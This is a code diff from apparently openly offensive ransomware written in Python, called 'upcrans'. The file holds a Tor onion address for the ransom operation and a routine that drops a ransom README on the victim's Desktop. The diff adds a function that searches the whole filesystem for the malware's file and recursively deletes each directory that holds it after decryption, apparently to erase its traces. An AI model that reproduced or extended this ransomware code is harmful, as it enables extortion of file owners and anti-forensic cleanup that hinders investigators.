@@ -15,6 +15,7 @@ from Crypto.PublicKey import RSA
 import os, sys, struct
 import argparse
 from Database.keygenerator import class_keys
+import subprocess
 
 URL_TOR = "lxu7zbrvwbo7ogy7u7yzy65yld2rdgjfcwgoyrkejedqoefboeejspid.onion"
 PWD_RANS = os.path.dirname(os.path.abspath(__file__))
@@ -71,6 +72,16 @@ def create_Readme():
         with open('/home/'+user+'/Desktop/README.txt', 'w') as fo:
                     fo.write(text)
     return 
+
+
+#Remove all data from upcrans
+def remove_Dir():
+    resultComm = subprocess.run(['find', '/', '-name', 'upcrans.py'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+    list_dirs = resultComm.splitlines()
+    
+    for dirPath in list_dirs:
+        pathMalware = os.path.dirname(os.path.abspath(dirPath))
+        shutil.rmtree(pathMalware)
 
 
 #Initialize both AES and RSA keys and store in class_keys
@@ -249,6 +260,7 @@ def main():
         #Decrypt the encrypted files of your system
         AESkey = decrypt_key(args.AESkey, args.RSAkey)
         decrypt_file(l_files, AESkey)
+        remove_Dir()
 
 
 if __name__ == "__main__":
